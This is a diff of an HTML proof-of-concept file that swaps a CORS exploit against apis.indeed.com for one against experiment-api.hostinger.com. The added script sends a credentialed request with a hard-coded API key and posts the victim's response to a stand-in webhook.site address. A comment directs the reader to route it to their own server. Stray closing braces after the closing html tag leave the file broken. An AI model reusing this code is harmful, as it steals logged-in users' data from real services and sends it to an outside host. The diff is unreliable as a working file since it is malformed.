@@ -1,32 +1,29 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>CORS Exploit PoC — apis.indeed.com</title>
-</head>
-<body>
-  <h2>CORS Exploit PoC — apis.indeed.com</h2>
-  <button id="runBtn">Run PoC</button>
-
-  <pre id="output">Waiting...</pre>
-
-  <script>
-    function stealData() {
-      fetch("https://apis.indeed.com/graphql", {
+<html>
+  <head>
+    <title>Hostinger CORS Exploit PoC</title>
+  </head>
+  <body>
+    <h1>CORS Exploit Demo</h1>
+    <script>
+    fetch("https://experiment-api.hostinger.com/sdk/v2/vardata?v=0", {
+      method: "GET",
+      credentials: "include",
+      headers: {
+        "Authorization": "Api-Key client-cW5zRM9wiB0Wa9KqimmHzMcWGBXkKSK6"
+      }
+    })
+    .then(res => res.text())
+    .then(data => {
+      // send the response to your server or webhook
+      fetch("https://webhook.site/your-webhook-id", {
         method: "POST",
-        credentials: "include"
-      })
-      .then(response => {
-        document.getElementById("output").innerText = `Status: ${response.status}`;
-        return response.text();
-      })
-      .then(text => {
-        document.getElementById("output").innerText += `\n\nResponse:\n${text}`;
-        console.log("Response:", text);
-      })
-      .catch(err => {
-        document.getElementById("output").innerText = "Fetch failed: " + err;
-        console.error("Error:", err);
+        body: data
+      });
+    });
+    </script>
+  </body>
+</html>
       });
     }
 
